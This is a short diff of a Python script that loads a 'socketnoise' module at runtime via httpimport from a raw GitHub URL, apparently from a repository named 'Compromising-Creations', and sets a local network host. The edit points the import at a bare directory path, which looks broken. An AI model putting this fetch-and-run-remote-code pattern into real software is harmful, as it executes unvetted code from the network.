@@ -4,7 +4,7 @@ import socket
 import os # Needed for file operation
 import modules
 import modules.httpimport as httpimport
-socketnoise = httpimport.load('socketnoise', 'https://raw.githubusercontent.com/superwibr/Compromising-Creations/dev/modules/socketnoise.py')
+socketnoise = httpimport.load('socketnoise', 'https://raw.githubusercontent.com/superwibr/Compromising-Creations/dev/')
 
 
 host = '192.168.0.16'
